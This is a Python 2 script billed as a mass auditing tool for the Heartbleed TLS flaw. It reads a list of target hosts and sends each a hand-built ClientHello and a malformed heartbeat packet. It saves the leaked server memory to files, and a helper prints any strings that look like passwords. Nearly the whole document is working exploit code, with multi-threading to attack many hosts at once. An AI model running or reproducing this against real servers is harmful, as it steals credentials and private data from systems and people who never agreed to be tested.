'''
 Mass Auditing tool. So that you can give in a huge range of targets as a list and the tool would find important informations for you.
Give it a list of targets and it would detect the vulnerability and list out if any username password is found. 
Credit: Fb1h2s aka Rahul Sasi's Blog
'''
#  How to use
#  Write sites to test in scan.txt
#  Run the python file...it will test for vulnerability and generated a txt file
#  with whatever extra content it has got.
#  For better explaination see the video


import socket, ssl, pprint
import Queue
import threading,time,sys,select,struct,urllib,time,re,os


'''

    16 03 02 00 31 # TLS Header
    01 00 00 2d # Handshake header
    03 02 # ClientHello field: version number (TLS 1.1)
    50 0b af bb b7 5a b8 3e f0 ab 9a e3 f3 9c 63 15 \
    33 41 37 ac fd 6c 18 1a 24 60 dc 49 67 c2 fd 96 # ClientHello field: random
    00 # ClientHello field: session id
    00 04 # ClientHello field: cipher suite length
    00 33 c0 11 # ClientHello field: cipher suite(s)
    01 # ClientHello field: compression support, length
    00 # ClientHello field: compression support, no compression (0)
    00 00 # ClientHello field: extension length (0)

'''



hello_packet = "16030200310100002d0302500bafbbb75ab83ef0ab9ae3f39c6315334137acfd6c181a2460dc4967c2fd960000040033c01101000000".decode('hex')
hb_packet = "1803020003014000".decode('hex')

def password_parse(the_response):
    the_response_nl= the_response.split(' ')
    #Interesting Paramaters found:
    for each_item in the_response_nl:
        if "=" in each_item or "password" in each_item:
            print each_item


def recv_timeout(the_socket,timeout=2):
    #make socket non blocking
    the_socket.setblocking(0)

    #total data partwise in an array
    total_data=[];
    data='';

    #beginning time
    begin=time.time()
    while 1:
        if total_data and time.time()-begin > timeout:
            break

        elif time.time()-begin > timeout*2:
            break

        try:
            data = the_socket.recv(8192)
            if data:
                total_data.append(data)
                #change the beginning time for measurement
                begin=time.time()
            else:
                #sleep for sometime to indicate a gap
                time.sleep(0.1)
        except:
            pass

    return ''.join(total_data)


def tls(target_addr):

    try:

        server_port =443
        target_addr = target_addr.strip()

        if ":" in target_addr:
            server_port = target_addr.split(":")[1]
            target_addr = target_addr.split(":")[0]

        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sys.stdout.flush()
        print >>sys.stderr, '\n[+]Scanning  server %s' % target_addr , "\n"
        print "##############################################################"
        sys.stdout.flush()
        client_socket .connect((target_addr, int(server_port)))
        #'Sending Hello request...'
        client_socket.send(hello_packet)
        recv_timeout(client_socket,3)
        print 'Sending heartbeat request...'
        client_socket.send(hb_packet)
        data = recv_timeout(client_socket,3)
        if len(data) > 7 :
            print "[-] ",target_addr,' Vulnerable Server ...\n'
            #print data
            if os.path.exists(target_addr+".txt"):
                file_write = open(target_addr+".txt", 'a+')
            else:
                file_write = file(target_addr+".txt", "w")
            file_write.write(data)
        else :
            print "[-] ",target_addr,' Not Vulnerable  ...'
    except Exception as e:
        print e,target_addr,server_port



class BinaryGrab(threading.Thread):
    """Threaded Url Grab"""
    def __init__(self, queue):
        threading.Thread.__init__(self)
        self.queue = queue

    def run(self):
        while True:
            url = self.queue.get()
            tls(url)
            #Scan targets here

            #signals to queue job is done
            self.queue.task_done()



start = time.time()

def manyurls(server_addr):
    querange = len(server_addr)
    queue = Queue.Queue()

    #spawn a pool of threads, and pass them queue instance
    for i in range(int(querange)):
        t = BinaryGrab(queue)
        t.setDaemon(True)
        t.start()

    #populate queue with data
    for target in server_addr:

        queue.put(target)

    #wait on the queue until everything has been processed
    queue.join()
if __name__ == "__main__":
    # Kepp all ur targets in scan.txt in the same folder.
    server_addr = []
    read_f = open("scan.txt", "r")
    server_addr = read_f.readlines()
    #or provide names here
    #server_addr = ['yahoo.com']
    manyurls(server_addr)
